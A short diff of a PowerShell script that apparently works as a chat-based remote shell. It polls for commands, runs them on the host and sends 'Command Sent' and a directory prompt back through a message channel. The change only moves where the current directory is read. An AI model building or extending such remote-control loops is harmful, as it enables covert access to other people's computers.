@@ -1322,7 +1322,6 @@ while($true){
 
     PullMsg
     if (!($response -like "$previouscmd")) {
-	$dir = $PWD.Path
         Write-Output "Command found!"
         if($authenticated -ne 1){
             if ($response -like "ShowAll") {
@@ -1349,6 +1348,7 @@ while($true){
                     $script:previouscmd = $response
                     sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                     sleep -m 250
+		    $dir = $PWD.Path
                     sendMsg -Message "``PS | $dir>``"
                 }
                 else {
@@ -1372,6 +1372,7 @@ while($true){
                         sendMsg -Message "``````$($batch -join "`n")``````"
                         sleep -m 250
                     }
+		    $dir = $PWD.Path
                     sendMsg -Message "``PS | $dir>``"
                 }
             }
